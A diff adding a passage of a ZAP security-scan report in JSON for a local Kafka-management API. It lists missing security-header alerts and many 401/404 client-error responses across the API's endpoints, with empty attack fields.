@@ -1,0 +1,5281 @@
+{
+	"@programName": "ZAP",
+	"@version": "2.17.0",
+	"@generated": "Mon, 9 Mar 2026 08:10:24",
+	"created": "2026-03-09T08:10:24.679415716Z",
+	"insights":[
+		{
+			"level": "Low",
+			"reason": "Warning",
+			"site": "",
+			"key": "insight.log.warn",
+			"description": "ZAP warnings logged - see the zap.log file for details",
+			"statistic": "105"
+		},
+		{
+			"level": "Low",
+			"reason": "Exceeded High",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.code.4xx",
+			"description": "Percentage of responses with status code 4xx",
+			"statistic": "99"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.code.2xx",
+			"description": "Percentage of responses with status code 2xx",
+			"statistic": "50"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.endpoint.ctype.application/json",
+			"description": "Percentage of endpoints with content type application/json",
+			"statistic": "100"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.endpoint.method.DELETE",
+			"description": "Percentage of endpoints with method DELETE",
+			"statistic": "4"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.endpoint.method.GET",
+			"description": "Percentage of endpoints with method GET",
+			"statistic": "51"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.endpoint.method.POST",
+			"description": "Percentage of endpoints with method POST",
+			"statistic": "41"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.endpoint.method.PUT",
+			"description": "Percentage of endpoints with method PUT",
+			"statistic": "2"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.endpoint.total",
+			"description": "Count of total endpoints",
+			"statistic": "496"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:8000",
+			"key": "insight.response.slow",
+			"description": "Percentage of slow responses",
+			"statistic": "50"
+		}
+	],
+	"site":[ 
+		{
+			"@name": "http://host.docker.internal:8000",
+			"@host": "host.docker.internal",
+			"@port": "8000",
+			"@ssl": "false",
+			"alerts": [ 
+				{
+					"pluginid": "90004",
+					"alertRef": "90004-1",
+					"alert": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"name": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.</p>",
+					"instances":[ 
+						{
+							"id": "2138",
+							"uri": "http://host.docker.internal:8000/api/health",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/health",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "25",
+							"uri": "http://host.docker.internal:8000/openapi.json",
+							"nodeName": "http:\/\/host.docker.internal:8000\/openapi.json",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "2",
+					"systemic": true,
+					"solution": "<p>Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.</p><p>'same-site' is considered as less secured and should be avoided.</p><p>If resources must be shared, set the header to 'cross-origin'.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy</p>",
+					"cweid": "693",
+					"wascid": "14",
+					"sourceid": "168"
+				},
+				{
+					"pluginid": "10021",
+					"alertRef": "10021",
+					"alert": "X-Content-Type-Options Header Missing",
+					"name": "X-Content-Type-Options Header Missing",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>",
+					"instances":[ 
+						{
+							"id": "2136",
+							"uri": "http://host.docker.internal:8000/api/health",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/health",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						},
+						{
+							"id": "22",
+							"uri": "http://host.docker.internal:8000/openapi.json",
+							"nodeName": "http:\/\/host.docker.internal:8000\/openapi.json",
+							"method": "GET",
+							"param": "x-content-type-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.\nAt \"High\" threshold this scan rule will not alert on client or server error responses."
+						}
+					],
+					"count": "2",
+					"systemic": true,
+					"solution": "<p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>",
+					"otherinfo": "<p>This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At \"High\" threshold this scan rule will not alert on client or server error responses.</p>",
+					"reference": "<p>https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)</p><p>https://owasp.org/www-community/Security_Headers</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "168"
+				},
+				{
+					"pluginid": "100000",
+					"alertRef": "100000",
+					"alert": "A Client Error response code was returned by the server",
+					"name": "A Client Error response code was returned by the server",
+					"riskcode": "0",
+					"confidence": "3",
+					"riskdesc": "Informational (High)",
+					"desc": "<p>A response code of 401 was returned by the server.</p><p>This may indicate that the application is failing to handle unexpected input correctly.</p><p>Raised by the 'Alert on HTTP Response Code Error' script</p>",
+					"instances":[ 
+						{
+							"id": "7",
+							"uri": "http://host.docker.internal:8000/api/auth/users/user_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/user_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8413",
+							"uri": "http://host.docker.internal:8000/api/auth/users/user_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/user_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "104",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8424",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "18",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8436",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "46",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8452",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "70",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history/history_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history\/history_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8446",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history/history_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history\/history_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "57",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls ()({principal,resource_type,resource_name,pattern_type,operations,permission_type,host})",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8469",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/ ()({principal,resource_type,resource_name,pattern_type,operations,permission_type,host})",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "53",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8470",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8459",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services/service_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services\/service_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "28",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services/service_id?force=false",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services\/service_id (force)",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8487",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services/service_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services\/service_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "36",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/topic_name",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/topic_name",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8491",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/topic_name/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/topic_name\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "12",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8494",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "94",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8496",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/",
+							"method": "DELETE",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "189",
+							"uri": "http://host.docker.internal:8000",
+							"nodeName": "http:\/\/host.docker.internal:8000",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8507",
+							"uri": "http://host.docker.internal:8000/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "110",
+							"uri": "http://host.docker.internal:8000/1290152413652233274",
+							"nodeName": "http:\/\/host.docker.internal:8000\/1290152413652233274",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "207",
+							"uri": "http://host.docker.internal:8000/api",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8521",
+							"uri": "http://host.docker.internal:8000/api/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "111",
+							"uri": "http://host.docker.internal:8000/api/8883467432723822120",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/8883467432723822120",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "226",
+							"uri": "http://host.docker.internal:8000/api/auth",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8523",
+							"uri": "http://host.docker.internal:8000/api/auth/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "112",
+							"uri": "http://host.docker.internal:8000/api/auth/2235395793385764724",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/2235395793385764724",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9825",
+							"uri": "http://host.docker.internal:8000/api/auth/actuator/health",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/actuator\/health",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "3",
+							"uri": "http://host.docker.internal:8000/api/auth/me",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/me",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8527",
+							"uri": "http://host.docker.internal:8000/api/auth/me/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/me\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4",
+							"uri": "http://host.docker.internal:8000/api/auth/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8530",
+							"uri": "http://host.docker.internal:8000/api/auth/users/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "113",
+							"uri": "http://host.docker.internal:8000/api/auth/users/2621107584807666108",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/2621107584807666108",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "635",
+							"uri": "http://host.docker.internal:8000/api/broker-config",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8529",
+							"uri": "http://host.docker.internal:8000/api/broker-config/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "114",
+							"uri": "http://host.docker.internal:8000/api/broker-config/2282480294867740274",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/2282480294867740274",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "642",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8533",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "115",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/5723583665661225597",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/5723583665661225597",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "647",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/audit_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/audit_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8534",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/audit_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/audit_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "116",
+							"uri": "http://host.docker.internal:8000/api/broker-config/audit/audit_id/9088030820374661094",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/audit\/audit_id\/9088030820374661094",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "654",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8537",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "117",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/6927279283419539082",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/6927279283419539082",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "662",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8538",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "118",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/6807857029745466444",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/6807857029745466444",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8542",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/audit",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/audit",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "82",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/audit?limit=50",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/audit (limit)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8543",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/audit/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/audit\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "670",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8540",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "679",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/10",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/10",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8544",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/10/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/10\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "120",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/10/5137897276783453876",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/10\/5137897276783453876",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "119",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/338630523378327200",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/338630523378327200",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "79",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/configs",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/configs",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8554",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/configs/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/configs\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "83",
+							"uri": "http://host.docker.internal:8000/api/broker-config/metadata",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/metadata",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8547",
+							"uri": "http://host.docker.internal:8000/api/broker-config/metadata/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/metadata\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "688",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8548",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "121",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/9151720244277922645",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/9151720244277922645",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "100",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8560",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "122",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/782214135396191705",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/782214135396191705",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "102",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8558",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "123",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/2030459424683487309",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/2030459424683487309",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "109",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/metrics",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/metrics",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8564",
